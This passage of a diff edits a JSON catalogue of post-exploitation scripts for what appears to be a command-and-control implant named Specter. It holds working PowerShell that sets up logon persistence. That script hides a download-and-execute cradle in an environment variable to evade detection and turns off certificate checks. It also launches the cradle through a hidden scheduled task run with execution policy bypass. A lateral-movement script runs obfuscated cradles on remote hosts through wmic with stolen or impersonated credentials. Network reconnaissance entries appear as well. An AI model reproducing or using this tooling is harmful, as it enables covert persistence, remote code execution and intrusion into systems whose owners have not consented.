-    "documentation": "# Overview\r\n\r\nInstalls persistence by creating a scheduled task to run a PowerShell cradle on logon. The cradle is stored in a user environment variable to mitigate detection. The scheduled task is configured to execute the contents of the specified environment variable as the current user.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```json\r\n{\r\n  \"Persistence\": {\r\n    \"Id\": \"2ba6265671ee44ba81f1ec40304bb17c\",\r\n    \"Method\": \"Scheduled Task\",\r\n    \"Trigger\": \"OnLogon\",\r\n    \"Build\": \"92cbf1b0f92642859f28f258226cc1f3\",\r\n    \"Profile\": \"User\",\r\n    \"Event\": \"Create\",\r\n    \"Success\": true,\r\n    \"UninstallScript\": \"$output = (schtasks /DELETE /TN 'CacheTask' /F) -join ([System.Environment]::NewLine);\\r\\n$success = $output -like '*success*';\\r\\ntry {\\r\\n\\t[Environment]::SetEnvironmentVariable('GPO_AUX', $null, 'Machine');\\r\\n} catch {\\r\\n\\t$success = $false;\\r\\n\\tthrow;\\r\\n}\\r\\n\\r\\nNew-Object PSObject -Property @{\\r\\n\\tPersistence = New-Object PSObject -Property @{\\r\\n\\t\\tId = \\\"2ba6265671ee44ba81f1ec40304bb17c\\\";\\r\\n\\t\\tEvent = \\\"Delete\\\";\\r\\n\\t\\tSuccess = $success;\\r\\n\\t    Method = \\\"Scheduled Task\\\";\\r\\n\\t    Profile = \\\"User\\\";\\r\\n\\t    Trigger = \\\"OnLogon\\\";\\r\\n\\t}\\r\\n}\",\r\n    \"TaskName\": \"CacheTask\",\r\n    \"EnvironmentVariableName\": \"GPO_AUX\"\r\n  }\r\n}\r\n```",
-    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of the scheduled task.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$TaskName = 'CacheTask',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of an environment variable that will store the PowerShell cradle.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$EnvironmentVariableName = 'GPO_AUX',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The event that will activate the PowerShell cradle.\")]\r\n    [ValidateSet('OnLogon')]\r\n    [string]$Trigger = \"OnLogon\",\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\ntry {\r\n    #Get the URLs for the cradle generator\r\n\t$urls = (payload -Build $Build -Kind 'ps_url' | % { \"'$_'\" }) -Join \", \";\r\n\t$task = \"[Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; `$urls = @($urls); foreach(`$url in `$urls) { try { `$a = (New-Object Net.WebClient).DownloadString(`$url); iex `$a; } catch { } }\";\r\n\t[Environment]::SetEnvironmentVariable($EnvironmentVariableName, $task, \"User\")\r\n\t$output = (schtasks /CREATE /SC $Trigger /TN $TaskName /TR \"powershell.exe -WindowStyle hidden -NonInt -ep bypass -nop -c \\`\"iex ([Environment]::GetEnvironmentVariable(\\\\\\`\"$EnvironmentVariableName\\\\\\`\", \\\\\\`\"User\\\\\\`\"))\\`\"\" /F) -join ([Environment]::NewLine);\r\n\t$success = $output -like '*success*';\r\n} catch {\r\n\t$success = $false;\r\n\tthrow;\r\n}\r\n\r\n$id = [Guid]::NewGuid().ToString().Replace(\"-\", \"\");\r\n\r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = $id;\r\n\t\tEvent = \"Create\";\r\n\t\tSuccess = $success;\r\n\t    Method = \"Scheduled Task\";\r\n\t    Profile = \"User\";\r\n\t    Trigger = $Trigger;\r\n\t    TaskName = $TaskName;\r\n\t    EnvironmentVariableName = $EnvironmentVariableName;\r\n\t    Build = $Build;\r\n\t    UninstallScript = @\"\r\n`$output = (schtasks /DELETE /TN '$TaskName' /F) -join ([System.Environment]::NewLine);\r\n`$success = `$output -like '*success*';\r\ntry {\r\n\t[Environment]::SetEnvironmentVariable('$EnvironmentVariableName', `$null, 'Machine');\r\n} catch {\r\n\t`$success = `$false;\r\n\tthrow;\r\n}\r\n\r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = \"$id\";\r\n\t\tEvent = \"Delete\";\r\n\t\tSuccess = `$success;\r\n\t    Method = \"Scheduled Task\";\r\n\t    Profile = \"User\";\r\n\t    Trigger = \"$Trigger\";\r\n\t}\r\n}\r\n\"@;\r\n\t}\r\n}",
-    "version": 7,
-    "isPremium": true,
-    "labels": [
-      "command-line",
-      "event-triggered-execution",
-      "persistence",
-      "scheduled-task",
-      "windows",
-      "windows-command-shell",
-      "powershell",
-      "command-and-scripting-interpreter"
-    ],
-    "enabled": true
-  },
-  {
     "identifier": "e67933e81c3f4c0eab8392dced8a0e1a",
     "name": "System Persistence with WMI Event Subscription and PowerShell Cradle",
     "description": "Establishes System level persistence by registering a WMI Event Consumer that triggers when the startup time exceeds 1387 seconds and then runs a PowerShell cradle.",
@@ -948,6 +995,26 @@
       "persistence",
       "windows",
       "windows-management-instrumentation-event-subscription"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "97d6b0d64b4548b3b3e597786e97823c",
+    "name": "User Persistence with Scheduled Task Commandline and PowerShell Cradle",
+    "description": "Installs persistence by creating a scheduled task to run a PowerShell cradle on user logon.",
+    "documentation": "# Overview\r\n\r\nInstalls persistence by creating a scheduled task to run a PowerShell cradle on logon. The cradle is stored in a user environment variable to mitigate detection. The scheduled task is configured to execute the contents of the specified environment variable as the current user.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```json\r\n{\r\n  \"Persistence\": {\r\n    \"Id\": \"2ba6265671ee44ba81f1ec40304bb17c\",\r\n    \"Method\": \"Scheduled Task\",\r\n    \"Trigger\": \"OnLogon\",\r\n    \"Build\": \"92cbf1b0f92642859f28f258226cc1f3\",\r\n    \"Profile\": \"User\",\r\n    \"Event\": \"Create\",\r\n    \"Success\": true,\r\n    \"UninstallScript\": \"$output = (schtasks /DELETE /TN 'CacheTask' /F) -join ([System.Environment]::NewLine);\\r\\n$success = $output -like '*success*';\\r\\ntry {\\r\\n\\t[Environment]::SetEnvironmentVariable('GPO_AUX', $null, 'Machine');\\r\\n} catch {\\r\\n\\t$success = $false;\\r\\n\\tthrow;\\r\\n}\\r\\n\\r\\nNew-Object PSObject -Property @{\\r\\n\\tPersistence = New-Object PSObject -Property @{\\r\\n\\t\\tId = \\\"2ba6265671ee44ba81f1ec40304bb17c\\\";\\r\\n\\t\\tEvent = \\\"Delete\\\";\\r\\n\\t\\tSuccess = $success;\\r\\n\\t    Method = \\\"Scheduled Task\\\";\\r\\n\\t    Profile = \\\"User\\\";\\r\\n\\t    Trigger = \\\"OnLogon\\\";\\r\\n\\t}\\r\\n}\",\r\n    \"TaskName\": \"CacheTask\",\r\n    \"EnvironmentVariableName\": \"GPO_AUX\"\r\n  }\r\n}\r\n```",
+    "scriptBlock": "param(\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of the scheduled task.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$TaskName = 'CacheTask',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The name of an environment variable that will store the PowerShell cradle.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]$EnvironmentVariableName = 'GPO_AUX',\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The event that will activate the PowerShell cradle.\")]\r\n    [ValidateSet('OnLogon')]\r\n    [string]$Trigger = \"OnLogon\",\r\n\r\n    [Parameter(Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\ntry {\r\n    #Get the URLs for the cradle generator\r\n\t$urls = (payload -Build $Build -Kind 'ps_url' | % { \"'$_'\" }) -Join \", \";\r\n\t$task = \"[Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; `$urls = @($urls); foreach(`$url in `$urls) { try { `$a = (New-Object Net.WebClient).DownloadString(`$url); iex `$a; } catch { } }\";\r\n\t[Environment]::SetEnvironmentVariable($EnvironmentVariableName, $task, \"User\")\r\n\t$output = (schtasks /CREATE /SC $Trigger /TN $TaskName /TR \"powershell.exe -WindowStyle hidden -NonInt -ep bypass -nop -c \\`\"iex ([Environment]::GetEnvironmentVariable(\\\\\\`\"$EnvironmentVariableName\\\\\\`\", \\\\\\`\"User\\\\\\`\"))\\`\"\" /F) -join ([Environment]::NewLine);\r\n\t$success = $output -like '*success*';\r\n} catch {\r\n\t$success = $false;\r\n\tthrow;\r\n}\r\n\r\n$id = [Guid]::NewGuid().ToString().Replace(\"-\", \"\");\r\n\r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = $id;\r\n\t\tEvent = \"Create\";\r\n\t\tSuccess = $success;\r\n\t    Method = \"Scheduled Task\";\r\n\t    Profile = \"User\";\r\n\t    Trigger = $Trigger;\r\n\t    TaskName = $TaskName;\r\n\t    EnvironmentVariableName = $EnvironmentVariableName;\r\n\t    Build = $Build;\r\n\t    UninstallScript = @\"\r\n`$output = (schtasks /DELETE /TN '$TaskName' /F) -join ([System.Environment]::NewLine);\r\n`$success = `$output -like '*success*';\r\ntry {\r\n\t[Environment]::SetEnvironmentVariable('$EnvironmentVariableName', `$null, 'Machine');\r\n} catch {\r\n\t`$success = `$false;\r\n\tthrow;\r\n}\r\n\r\nNew-Object PSObject -Property @{\r\n\tPersistence = New-Object PSObject -Property @{\r\n\t\tId = \"$id\";\r\n\t\tEvent = \"Delete\";\r\n\t\tSuccess = `$success;\r\n\t    Method = \"Scheduled Task\";\r\n\t    Profile = \"User\";\r\n\t    Trigger = \"$Trigger\";\r\n\t}\r\n}\r\n\"@;\r\n\t}\r\n}",
+    "version": 7,
+    "isPremium": true,
+    "labels": [
+      "command-and-scripting-interpreter",
+      "command-line",
+      "event-triggered-execution",
+      "persistence",
+      "powershell",
+      "scheduled-task",
+      "windows",
+      "windows-command-shell"
     ],
     "enabled": true
   },
@@ -1000,20 +1067,18 @@
     "enabled": true
   },
   {
-    "identifier": "009f1a7444d44f849f0d325ca362662a",
-    "name": "Get Interfaces via API",
-    "description": "Displays information about the local network interfaces including: name, description, IPs, DNS servers, and ARP entries.",
-    "documentation": "# Overview\r\n\r\nLeverages APIs to gather the following information about each interface:\r\n\r\n- Name\r\n- Description\r\n- Status (e.g. Up, Down)\r\n- Type (e.g. Ethernet, Loopback)\r\n- IPs\r\n- DNS servers\r\n- WINS servers\r\n- ARP entries.\r\n\r\n# Dependencies\r\n\r\n- recon\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```json\r\n[\r\n  {\r\n    \"InterfaceIndex\": 1,\r\n    \"InterfaceName\": \"Loopback Pseudo-Interface 1\",\r\n    \"InterfaceDescription\": \"Software Loopback Interface 1\",\r\n    \"Status\": \"Up\",\r\n    \"InterfaceType\": \"Loopback\",\r\n    \"InterfaceIPs\": [\r\n      {\r\n        \"IP\": \"::1\",\r\n        \"Netmask\": \"0.0.0.0\"\r\n      },\r\n      {\r\n        \"IP\": \"127.0.0.1\",\r\n        \"Netmask\": \"255.0.0.0\"\r\n      }\r\n    ],\r\n    \"DnsServers\": [\r\n      \"fec0:0:0:ffff::1%1\",\r\n      \"fec0:0:0:ffff::2%1\",\r\n      \"fec0:0:0:ffff::3%1\"\r\n    ],\r\n    \"DhcpServers\": [],\r\n    \"WinsServers\": [],\r\n    \"Gateways\": [],\r\n    \"Entries\": [\r\n      {\r\n        \"Address\": \"224.0.0.22\",\r\n        \"PhysicalAddress\": \"00-00-00-00-00-00\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"239.255.255.250\",\r\n        \"PhysicalAddress\": \"00-00-00-00-00-00\",\r\n        \"EntryType\": \"Static\"\r\n      }\r\n    ]\r\n  },\r\n  {\r\n    \"InterfaceIndex\": 3,\r\n    \"InterfaceName\": \"Bluetooth Network Connection\",\r\n    \"InterfaceDescription\": \"Bluetooth Device (Personal Area Network)\",\r\n    \"Status\": \"Down\",\r\n    \"InterfaceType\": \"Ethernet\",\r\n    \"InterfaceIPs\": [\r\n      {\r\n        \"IP\": \"fe80::94af:e0eb:a646:a008%3\",\r\n        \"Netmask\": \"0.0.0.0\"\r\n      },\r\n      {\r\n        \"IP\": \"169.254.160.8\",\r\n        \"Netmask\": \"255.255.0.0\"\r\n      }\r\n    ],\r\n    \"DnsServers\": [\r\n      \"fec0:0:0:ffff::1%1\",\r\n      \"fec0:0:0:ffff::2%1\",\r\n      \"fec0:0:0:ffff::3%1\"\r\n    ],\r\n    \"DhcpServers\": [],\r\n    \"WinsServers\": [],\r\n    \"Gateways\": [],\r\n    \"Entries\": [\r\n      {\r\n        \"Address\": \"224.0.0.22\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-16\",\r\n        \"EntryType\": \"Static\"\r\n      }\r\n    ]\r\n  },\r\n  {\r\n    \"InterfaceIndex\": 5,\r\n    \"InterfaceName\": \"Ethernet0\",\r\n    \"InterfaceDescription\": \"Intel(R) 82574L Gigabit Network Connection\",\r\n    \"Status\": \"Up\",\r\n    \"InterfaceType\": \"Ethernet\",\r\n    \"InterfaceIPs\": [\r\n      {\r\n        \"IP\": \"fe80::4d29:4f21:ff5:d73f%5\",\r\n        \"Netmask\": \"0.0.0.0\"\r\n      },\r\n      {\r\n        \"IP\": \"192.168.1.103\",\r\n        \"Netmask\": \"255.255.255.0\"\r\n      }\r\n    ],\r\n    \"DnsServers\": [\r\n      \"192.168.1.2\"\r\n    ],\r\n    \"DhcpServers\": [\r\n      \"192.168.1.2\"\r\n    ],\r\n    \"WinsServers\": [\r\n      \"192.168.1.2\"\r\n    ],\r\n    \"Gateways\": [\r\n      \"192.168.1.1\"\r\n    ],\r\n    \"Entries\": [\r\n      {\r\n        \"Address\": \"192.168.1.2\",\r\n        \"PhysicalAddress\": \"00-0C-29-24-31-7C\",\r\n        \"EntryType\": \"Dynamic\"\r\n      },\r\n      {\r\n        \"Address\": \"192.168.1.104\",\r\n        \"PhysicalAddress\": \"00-0C-29-76-5E-F8\",\r\n        \"EntryType\": \"Dynamic\"\r\n      },\r\n      {\r\n        \"Address\": \"192.168.1.255\",\r\n        \"PhysicalAddress\": \"FF-FF-FF-FF-FF-FF\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"224.0.0.22\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-16\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"224.0.0.251\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-FB\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"224.0.0.252\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-FC\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"239.255.255.250\",\r\n        \"PhysicalAddress\": \"01-00-5E-7F-FF-FA\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"255.255.255.255\",\r\n        \"PhysicalAddress\": \"FF-FF-FF-FF-FF-FF\",\r\n        \"EntryType\": \"Static\"\r\n      }\r\n    ]\r\n  }\r\n]\r\n```",
-    "scriptBlock": "load recon;\r\n\r\nGet-Interfaces",
+    "identifier": "c9d714e83137443d9068300439669c0c",
+    "name": "Get All Open Connections via Commandline",
+    "description": "This script retrieves all open connections using netstat.",
+    "documentation": "# Overview\r\n\r\nThis script runs netstat with the -ano options to list all currently open connections.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```\r\nActive Connections\r\n\r\n  Proto  Local Address          Foreign Address        State           PID\r\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       996\r\n  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       9008\r\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\r\n  TCP    0.0.0.0:1337           0.0.0.0:0              LISTENING       9008\r\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1108\r\n  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5596\r\n  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       12440\r\n  TCP    0.0.0.0:17500          0.0.0.0:0              LISTENING       11348\r\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       756\r\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       588\r\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1328\r\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1292\r\n  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2372\r\n  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2964\r\n  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       712\r\n  TCP    127.0.0.1:843          0.0.0.0:0              LISTENING       11348\r\n  TCP    127.0.0.1:1337         127.0.0.1:51351        ESTABLISHED     9008\r\n  TCP    127.0.0.1:1337         127.0.0.1:64949        ESTABLISHED     9008\r\n  TCP    127.0.0.1:17600        0.0.0.0:0              LISTENING       11348\r\n  TCP    127.0.0.1:51351        127.0.0.1:1337         ESTABLISHED     11592\r\n  TCP    127.0.0.1:52818        0.0.0.0:0              LISTENING       8220\r\n  TCP    127.0.0.1:52818        127.0.0.1:52819        ESTABLISHED     8220\r\n  TCP    127.0.0.1:52819        127.0.0.1:52818        ESTABLISHED     9000\r\n  TCP    127.0.0.1:54123        127.0.0.1:54124        ESTABLISHED     1028\r\n  TCP    127.0.0.1:54124        127.0.0.1:54123        ESTABLISHED     1028\r\n  TCP    127.0.0.1:54125        127.0.0.1:54126        ESTABLISHED     14488\r\n  TCP    127.0.0.1:54126        127.0.0.1:54125        ESTABLISHED     14488\r\n  TCP    127.0.0.1:58014        127.0.0.1:58015        ESTABLISHED     11348\r\n  TCP    127.0.0.1:58015        127.0.0.1:58014        ESTABLISHED     11348\r\n  TCP    127.0.0.1:58016        127.0.0.1:58017        ESTABLISHED     11348\r\n  TCP    127.0.0.1:58017        127.0.0.1:58016        ESTABLISHED     11348\r\n  TCP    127.0.0.1:60460        127.0.0.1:1337         TIME_WAIT       0\r\n  TCP    127.0.0.1:64821        0.0.0.0:0              LISTENING       11652\r\n  TCP    127.0.0.1:64821        127.0.0.1:64836        ESTABLISHED     11652\r\n```",
+    "scriptBlock": "netstat -ano",
     "version": 1,
     "isPremium": true,
     "labels": [
-      "api",
+      "command-line",
       "discovery",
-      "network-discovery",
-      "passive",
-      "system-network-configuration-discovery",
-      "windows"
+      "host-discovery",
+      "windows-command-shell"
     ],
     "enabled": true
   },
@@ -1036,6 +1101,24 @@
     "enabled": true
   },
   {
+    "identifier": "009f1a7444d44f849f0d325ca362662a",
+    "name": "Get Interfaces via API",
+    "description": "Displays information about the local network interfaces including: name, description, IPs, DNS servers, and ARP entries.",
+    "documentation": "# Overview\r\n\r\nLeverages APIs to gather the following information about each interface:\r\n\r\n- Name\r\n- Description\r\n- Status (e.g. Up, Down)\r\n- Type (e.g. Ethernet, Loopback)\r\n- IPs\r\n- DNS servers\r\n- WINS servers\r\n- ARP entries.\r\n\r\n# Dependencies\r\n\r\n- recon\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Example Output\r\n\r\n```json\r\n[\r\n  {\r\n    \"InterfaceIndex\": 1,\r\n    \"InterfaceName\": \"Loopback Pseudo-Interface 1\",\r\n    \"InterfaceDescription\": \"Software Loopback Interface 1\",\r\n    \"Status\": \"Up\",\r\n    \"InterfaceType\": \"Loopback\",\r\n    \"InterfaceIPs\": [\r\n      {\r\n        \"IP\": \"::1\",\r\n        \"Netmask\": \"0.0.0.0\"\r\n      },\r\n      {\r\n        \"IP\": \"127.0.0.1\",\r\n        \"Netmask\": \"255.0.0.0\"\r\n      }\r\n    ],\r\n    \"DnsServers\": [\r\n      \"fec0:0:0:ffff::1%1\",\r\n      \"fec0:0:0:ffff::2%1\",\r\n      \"fec0:0:0:ffff::3%1\"\r\n    ],\r\n    \"DhcpServers\": [],\r\n    \"WinsServers\": [],\r\n    \"Gateways\": [],\r\n    \"Entries\": [\r\n      {\r\n        \"Address\": \"224.0.0.22\",\r\n        \"PhysicalAddress\": \"00-00-00-00-00-00\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"239.255.255.250\",\r\n        \"PhysicalAddress\": \"00-00-00-00-00-00\",\r\n        \"EntryType\": \"Static\"\r\n      }\r\n    ]\r\n  },\r\n  {\r\n    \"InterfaceIndex\": 3,\r\n    \"InterfaceName\": \"Bluetooth Network Connection\",\r\n    \"InterfaceDescription\": \"Bluetooth Device (Personal Area Network)\",\r\n    \"Status\": \"Down\",\r\n    \"InterfaceType\": \"Ethernet\",\r\n    \"InterfaceIPs\": [\r\n      {\r\n        \"IP\": \"fe80::94af:e0eb:a646:a008%3\",\r\n        \"Netmask\": \"0.0.0.0\"\r\n      },\r\n      {\r\n        \"IP\": \"169.254.160.8\",\r\n        \"Netmask\": \"255.255.0.0\"\r\n      }\r\n    ],\r\n    \"DnsServers\": [\r\n      \"fec0:0:0:ffff::1%1\",\r\n      \"fec0:0:0:ffff::2%1\",\r\n      \"fec0:0:0:ffff::3%1\"\r\n    ],\r\n    \"DhcpServers\": [],\r\n    \"WinsServers\": [],\r\n    \"Gateways\": [],\r\n    \"Entries\": [\r\n      {\r\n        \"Address\": \"224.0.0.22\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-16\",\r\n        \"EntryType\": \"Static\"\r\n      }\r\n    ]\r\n  },\r\n  {\r\n    \"InterfaceIndex\": 5,\r\n    \"InterfaceName\": \"Ethernet0\",\r\n    \"InterfaceDescription\": \"Intel(R) 82574L Gigabit Network Connection\",\r\n    \"Status\": \"Up\",\r\n    \"InterfaceType\": \"Ethernet\",\r\n    \"InterfaceIPs\": [\r\n      {\r\n        \"IP\": \"fe80::4d29:4f21:ff5:d73f%5\",\r\n        \"Netmask\": \"0.0.0.0\"\r\n      },\r\n      {\r\n        \"IP\": \"192.168.1.103\",\r\n        \"Netmask\": \"255.255.255.0\"\r\n      }\r\n    ],\r\n    \"DnsServers\": [\r\n      \"192.168.1.2\"\r\n    ],\r\n    \"DhcpServers\": [\r\n      \"192.168.1.2\"\r\n    ],\r\n    \"WinsServers\": [\r\n      \"192.168.1.2\"\r\n    ],\r\n    \"Gateways\": [\r\n      \"192.168.1.1\"\r\n    ],\r\n    \"Entries\": [\r\n      {\r\n        \"Address\": \"192.168.1.2\",\r\n        \"PhysicalAddress\": \"00-0C-29-24-31-7C\",\r\n        \"EntryType\": \"Dynamic\"\r\n      },\r\n      {\r\n        \"Address\": \"192.168.1.104\",\r\n        \"PhysicalAddress\": \"00-0C-29-76-5E-F8\",\r\n        \"EntryType\": \"Dynamic\"\r\n      },\r\n      {\r\n        \"Address\": \"192.168.1.255\",\r\n        \"PhysicalAddress\": \"FF-FF-FF-FF-FF-FF\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"224.0.0.22\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-16\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"224.0.0.251\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-FB\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"224.0.0.252\",\r\n        \"PhysicalAddress\": \"01-00-5E-00-00-FC\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"239.255.255.250\",\r\n        \"PhysicalAddress\": \"01-00-5E-7F-FF-FA\",\r\n        \"EntryType\": \"Static\"\r\n      },\r\n      {\r\n        \"Address\": \"255.255.255.255\",\r\n        \"PhysicalAddress\": \"FF-FF-FF-FF-FF-FF\",\r\n        \"EntryType\": \"Static\"\r\n      }\r\n    ]\r\n  }\r\n]\r\n```",
+    "scriptBlock": "load recon;\r\n\r\nGet-Interfaces",
+    "version": 1,
+    "isPremium": true,
+    "labels": [
+      "api",
+      "discovery",
+      "network-discovery",
+      "passive",
+      "system-network-configuration-discovery",
+      "windows"
+    ],
+    "enabled": true
+  },
+  {
     "identifier": "0d7c5d8cd9314c789fcef2db3cda67fd",
     "name": "Get Computers in Active Directory",
     "description": "This script queries the local Active Directory instance for the FQDN and OS Version of each computer in Active Directory.",
@@ -1053,26 +1136,6 @@
     "enabled": true
   },
   {
-    "identifier": "e1be6771f4154c48a2a0af57284a87ca",
-    "name": "Lateral Movement with WMI and PowerShell Cradle via Commandline",
-    "description": "Run a PowerShell cradle on a remote system using wmic.exe.",
-    "documentation": "# Overview\r\n\r\nThis script leverages Windows Management Instrumentation (WMI) commandline tool, wmic.exe, to start a process on the operator specified system using username and password or impersonation. An obfuscated PowerShell cradle is executed as either the specified user. The $Target parameter can be either hostname, FQDN, or IP.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- Valid administrator credentials for the target systems.\r\n- WMI service must be running on the remote system.\r\n- WMI must be allowed through the firewall.\r\n\r\n# Example Output\r\n\r\n```\r\nExecuting (Win32_Process)->Create()\r\n\r\nMethod execution successful.\r\n\r\nOut Parameters:\r\ninstance of __PARAMETERS\r\n{\r\n\tProcessId = 1904;\r\n\tReturnValue = 0;\r\n};\r\n```",
-    "scriptBlock": "param(\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The IP address or hostname of the system to run the cradle.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Target,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The local or domain username to authenticate with.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Username,\r\n\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory=$True, HelpMessage=\"The password for the specified user.\")]\r\n    [ValidateNotNullOrEmpty]\r\n    [string]$Password,\r\n\r\n    [Parameter(ParameterSetName=\"Impersonate\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [Parameter(ParameterSetName=\"Username and Password\", Mandatory = $true, HelpMessage = \"The Specter build identifier.\")]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Build]\r\n    [string]$Build\r\n)\r\n\r\n#Generate a new PowerShell cradle command\r\n$Command = payload -Build $Build -Kind 'ps_command';\r\n\r\n#Shell escape any embedded slashes\r\n$Command = $Command.Replace('\\', '\\\\');\r\n$Command = $Command.Replace('\"', '\\\"');\r\n\r\n#Execute command on remote system using WMI commandline executable\r\nif(![String]::IsNullOrEmpty($Username) -and $Password -ne $null) {\r\n    #Run with explicit credentials\r\n    wmic.exe /node:$Target /user:$Username /password:$Password process call create $Command;\r\n} else {\r\n    #Run with impersonation\r\n    wmic.exe /node:$Target process call create $Command;\r\n}",
-    "version": 5,
-    "isPremium": true,
-    "labels": [
-      "command-line",
-      "command-and-scripting-interpreter",
-      "powershell",
-      "execution",
-      "lateral-movement",
-      "windows-management-instrumentation",
-      "windows",
-      "windows-command-shell"
-    ],
-    "enabled": true
-  },
-  {
     "identifier": "3d9fd5526d644257801b1ddca9866ecf",
     "name": "Remote Command via WMI",
     "description": "The script will run a command on a remote system using the WMI API.",
@@ -1084,6 +1147,26 @@
       "api",
       "execution",
       "lateral-movement"
+    ],
+    "enabled": true
+  },
+  {
+    "identifier": "e1be6771f4154c48a2a0af57284a87ca",
+    "name": "Lateral Movement with WMI and PowerShell Cradle via Commandline",
+    "description": "Run a PowerShell cradle on a remote system using wmic.exe.",
+    "documentation": "# Overview\r\n\r\nThis script leverages Windows Management Instrumentation (WMI) commandline tool, wmic.exe, to start a process on the operator specified system using username and password or impersonation. An obfuscated PowerShell cradle is executed as either the specified user. The $Target parameter can be either hostname, FQDN, or IP.\r\n\r\n# Dependencies\r\n\r\n- None\r\n\r\n# Operating Systems\r\n\r\n- Windows\r\n\r\n# Pre-Requisites\r\n\r\n- Valid administrator credentials for the target systems.\r\n- WMI service must be running on the remote system.\r\n- WMI must be allowed through the firewall.\r\n\r\n# Example Output\r\n\r\n```\r\nExecuting (Win32_Process)->Create()\r\n\r\nMethod execution successful.\r\n\r\nOut Parameters:\r\ninstance of __PARAMETERS\r\n{\r\n\tProcessId = 1904;\r\n\tReturnValue = 0;\r\n};\r\n```",
